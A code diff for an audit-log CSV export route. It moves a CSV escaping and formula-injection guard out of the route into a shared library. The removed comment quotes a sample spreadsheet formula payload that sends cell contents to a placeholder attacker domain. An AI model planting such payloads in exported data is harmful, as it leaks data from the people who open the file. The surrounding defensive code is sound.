@@ -5,6 +5,7 @@ import { db } from "@/db";
 import { auditLogs, usage } from "@/db/schema";
 import { and, eq, gte, lte, desc } from "drizzle-orm";
 import { createLogger } from "@/lib/logger";
+import { csvEscape } from "@/lib/csv";
 
 const log = createLogger("audit-export");
 
@@ -204,33 +205,6 @@ export async function GET(req: Request) {
       "Cache-Control": "no-store",
     },
   });
-}
-
-/**
- * RFC 4180 escape + CSV formula-injection guard.
- *
- * Two threats:
- *   1. Field containing quote/comma/newline — RFC 4180 wrap-in-quotes
- *   2. Field starting with =, +, -, @, \t, \r — when Excel / Numbers /
- *      Google Sheets opens the CSV, these are interpreted as formulas,
- *      giving the attacker RCE in the admin's spreadsheet.
- *      e.g. action="=HYPERLINK(\"evil.com?\"&A1)"
- *
- * Fix: prefix such fields with a tab character (\t), which Excel
- * strips silently on import for text cells. This is the OWASP-recommended
- * mitigation for CSV injection. Then apply the RFC 4180 quoting.
- */
-function csvEscape(value: string | null | undefined): string {
-  if (value === null || value === undefined) return "";
-  let s = String(value);
-  // Formula-injection guard — see OWASP CSV Injection cheat sheet
-  if (/^[=+\-@\t\r]/.test(s)) {
-    s = "\t" + s;
-  }
-  if (s.includes('"') || s.includes(",") || s.includes("\n") || s.includes("\r")) {
-    return `"${s.replace(/"/g, '""')}"`;
-  }
-  return s;
 }
 
 /** Truncate very long body strings to prevent exposing full customer data. */
